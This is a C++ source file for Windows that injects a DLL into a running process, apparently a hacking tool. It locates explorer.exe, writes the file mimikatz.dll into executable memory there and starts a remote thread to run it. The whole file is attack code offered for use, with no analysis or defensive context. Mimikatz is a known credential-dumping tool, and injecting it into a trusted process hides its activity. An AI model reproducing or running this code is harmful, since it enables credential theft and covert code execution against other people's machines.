#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <vector>
#pragma comment(lib, "shlwapi.lib")

DWORD GetProcId(const char* processName) {
    PROCESSENTRY32 pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    if (Process32First(snapshot, &pe32)) {
        do {
            if (!_stricmp(pe32.szExeFile, processName)) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe32));
    }
    CloseHandle(snapshot);
    return pid;
}

bool ReflectiveInject(DWORD pid, const std::vector<char>& dllBuffer) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    void* remoteMem = VirtualAllocEx(hProcess, nullptr, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return false;
    }

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMem, dllBuffer.data(), dllBuffer.size(), &written)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Assuming the DLL has a reflective entrypoint at its start
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

int main() {
    std::string pname = "explorer.exe"; // example target
    std::string dllFile = "mimikatz.dll";

    if (!PathFileExistsA(dllFile.c_str())) {
        std::cerr << "DLL not found\n";
        return -1;
    }

    DWORD pid = GetProcId(pname.c_str());
    if (!pid) {
        std::cerr << "Target process not found.\n";
        return -1;
    }

    std::ifstream dll(dllFile, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(dll)), std::istreambuf_iterator<char>());
    dll.close();

    if (ReflectiveInject(pid, buffer)) {
        std::cout << "Reflective Injection Successful.\n";
    }
    else {
        std::cout << "Injection Failed.\n";
    }

    return 0;
}
